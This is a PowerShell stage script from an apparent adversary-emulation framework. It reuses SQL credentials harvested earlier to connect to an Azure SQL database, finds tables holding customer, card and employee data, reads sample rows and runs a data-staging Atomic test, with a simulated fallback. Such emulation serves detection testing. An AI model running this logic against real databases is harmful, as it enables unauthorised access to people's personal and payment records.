# ==================================================
# Phase6_SQL_Breach.ps1
# Azure SQL Database Compromise
# ==================================================

# Check initialization
if (-not $global:JARVIS_CONFIG) {
    Write-Host "Error: Please run 00_Initialize.ps1 first" -ForegroundColor Red
    exit
}

# Check Phase 4 results
$sqlCredentials = $global:azureCredentials | Where-Object { $_.Type -like "*SQL*" }

if ($sqlCredentials.Count -eq 0) {
    Write-Host "Error: No SQL credentials found from Phase 4" -ForegroundColor Red
    Write-Host "  Skipping Phase 6" -ForegroundColor Yellow
    exit
}

Write-Host "`n[PHASE 6] SQL DATABASE COMPROMISE" -ForegroundColor Yellow
Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor Yellow

$sqlCred = $sqlCredentials[0]
$sqlServer = $sqlCred.Server
$sqlUser = if ($sqlCred.UserID) { $sqlCred.UserID } else { "dbadmin" }
$sqlPassword = $sqlCred.Password
$sqlDatabase = if ($sqlCred.Database) { $sqlCred.Database } else { "CustomDB" }

Write-Host "[*] SQL Server information:" -ForegroundColor Gray
Write-Host "  Server: $sqlServer" -ForegroundColor Gray
Write-Host "  Database: $sqlDatabase" -ForegroundColor Gray
Write-Host "  Password: $sqlPassword" -ForegroundColor Gray

# Step 6.1: SQL Server connection
Write-Host "`n[Step 6.1] T1190 - Connecting to SQL Server..." -ForegroundColor Cyan

$connectionString = "Server=$sqlServer;Database=$sqlDatabase;User Id=$sqlUser;Password=$sqlPassword;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"

Write-Host "  [*] Attempting connection..." -ForegroundColor Gray

$sqlConnected = $false
$connection = $null

try {
    $connection = New-Object System.Data.SqlClient.SqlConnection
    $connection.ConnectionString = $connectionString
    $connection.Open()

    Write-Host "  ✓ SQL Server connection successful" -ForegroundColor Green
    $sqlConnected = $true

} catch {
    Write-Host "  ✗ Connection failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "  [Simulation] Proceeding in demo mode" -ForegroundColor Yellow
}

# Step 6.2: Database structure enumeration
Write-Host "`n[Step 6.2] Enumerating database structure..." -ForegroundColor Cyan

$databases = @()
$tables = @()

if ($sqlConnected) {
    try {
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT DB_NAME()"
        $currentDB = $command.ExecuteScalar()

        Write-Host "  ✓ Current database: $currentDB" -ForegroundColor Green
        $databases += $currentDB

        # Table list
        $command.CommandText = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'"
        $reader = $command.ExecuteReader()

        while ($reader.Read()) {
            $tables += $reader.GetString(0)
        }
        $reader.Close()

        Write-Host "  ✓ Tables discovered: $($tables.Count)" -ForegroundColor Green

    } catch {
        Write-Host "  ✗ Enumeration failed: $($_.Exception.Message)" -ForegroundColor Red
        $databases = @("CustomDB")
    }
} else {
    $databases = @("CustomDB")
}

# Step 6.3: Sensitive data extraction
Write-Host "`n[Step 6.3] T1213 - Extracting sensitive data..." -ForegroundColor Cyan

$global:sqlExfiltratedData = @()
$totalRecords = 0

$targetDB = if ($databases -contains "CustomDB") { "CustomDB" } else { $databases[0] }

Write-Host "  [Target] $targetDB" -ForegroundColor Yellow

if ($sqlConnected) {
    try {
        $sensitiveTablePatterns = @("Customer", "User", "Employee", "Payment", "Credit", "Personal")

        foreach ($table in $tables) {
            $isSensitive = $false
            foreach ($pattern in $sensitiveTablePatterns) {
                if ($table -like "*$pattern*") {
                    $isSensitive = $true
                    break
                }
            }

            if ($isSensitive) {
                Write-Host "`n  [CRITICAL] Sensitive table: $table" -ForegroundColor Red

                $command = $connection.CreateCommand()
                $command.CommandText = "SELECT COUNT(*) FROM [$table]"

                try {
                    $totalRows = $command.ExecuteScalar()

                    $command.CommandText = "SELECT TOP 100 * FROM [$table]"
                    $reader = $command.ExecuteReader()
                    $rowCount = 0

                    while ($reader.Read()) {
                        $rowCount++
                    }
                    $reader.Close()

                    Write-Host "    Total: $totalRows rows" -ForegroundColor Gray
                    Write-Host "    Exfiltrated: $rowCount rows (sample)" -ForegroundColor Yellow

                    $global:sqlExfiltratedData += @{
                        Table = $table
                        Records = $rowCount
                        TotalRecords = $totalRows
                        Database = $targetDB
                    }

                    $totalRecords += $rowCount

                } catch {
                    Write-Host "    ✗ Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }

    } catch {
        Write-Host "  ✗ Data extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    # Simulation
    Write-Host "  [Simulation] Extracting sensitive data" -ForegroundColor Gray
    
    $simulatedQueries = @(
        @{Table="Customers"; Records=100; TotalRecords=20847; Database="CustomDB"},
        @{Table="CreditCards"; Records=100; TotalRecords=5432; Database="CustomDB"},
        @{Table="Employees"; Records=100; TotalRecords=847; Database="CustomDB"}
    )

    foreach ($query in $simulatedQueries) {
        Write-Host "`n  [CRITICAL] $($query.Table)" -ForegroundColor Red
        Write-Host "    Total: $($query.TotalRecords) rows" -ForegroundColor Gray
        Write-Host "    Exfiltrated: $($query.Records) rows" -ForegroundColor Yellow

        $global:sqlExfiltratedData += $query
        $totalRecords += $query.Records
    }
}

# Close connection
if ($sqlConnected -and $connection) {
    $connection.Close()
}

# Save results
$global:sqlExfiltratedData | ConvertTo-Json | Out-File "$global:logPath\phase6_sql_data.json"

# Atomic Test - T1074.001: Data Staged (preparing data before exfiltration)
Write-Host "`n[Step 6.4] Atomic Test T1074.001 - Executing Data Staged..." -ForegroundColor Cyan
Write-Host "  [*] Staging data locally for exfiltration..." -ForegroundColor Gray

try {
    # T1074.001: Local Data Staging - collecting data in local directory before exfiltration
    Invoke-AtomicTest T1074.001 -TestNumbers 1 -ShowDetails -ErrorAction SilentlyContinue
    Write-Host "  ✓ Data Staging completed (exfiltration scheduled for Phase 7)" -ForegroundColor Green
} catch {
    Write-Host "  ⚠ Atomic Test skipped (simulation mode)" -ForegroundColor Yellow
}

# Summary
Write-Host "`n" -NoNewline
Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              PHASE 6 SUMMARY                               ║
╟────────────────────────────────────────────────────────────╢
║ SQL Server: $sqlServer
║ Database: $targetDB
║
║ Tables discovered: $($tables.Count)
║ Sensitive tables: $($global:sqlExfiltratedData.Count)
║ Total exfiltrated records: $totalRecords rows
║
║ Next step: Phase 7 (Data Exfiltration)
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Green

Write-Host "`n[PHASE 6] Completed - Proceed to Phase 7`n" -ForegroundColor Green